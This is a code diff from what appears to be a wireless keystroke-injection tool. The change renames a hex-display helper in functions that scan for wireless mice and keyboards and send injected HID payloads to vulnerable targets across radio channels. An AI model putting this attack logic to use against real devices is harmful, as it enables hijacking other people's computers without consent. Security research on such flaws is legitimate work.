@@ -42,17 +42,17 @@ def launch_attacks(jack, targets, attack):
 
             if lock_channel:
                 print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
-                print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), lock_channel))
+                print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.to_display(address), hid.description(), lock_channel))
                 jack.attack(hid(address, payload), attack)
             else:
                 # If our pings fail, go full hail mary
                 print(R + '[-] ' + W + 'Ping failed, trying all channels')
                 for channel in channels:
                     jack.set_channel(channel)
-                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), channel))
+                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.to_display(address), hid.description(), channel))
                     jack.attack(hid(address, payload), attack)
         else:
-            print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address)))
+            print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.to_display(address)))
             continue
 
 
@@ -82,7 +82,7 @@ def scan_loop(jack, interval, targeted, address):
             device['count'],
             str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
             device_name,
-            jack.hexify(device['payload'])
+            jack.to_display(device['payload'])
         ])
 
     print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
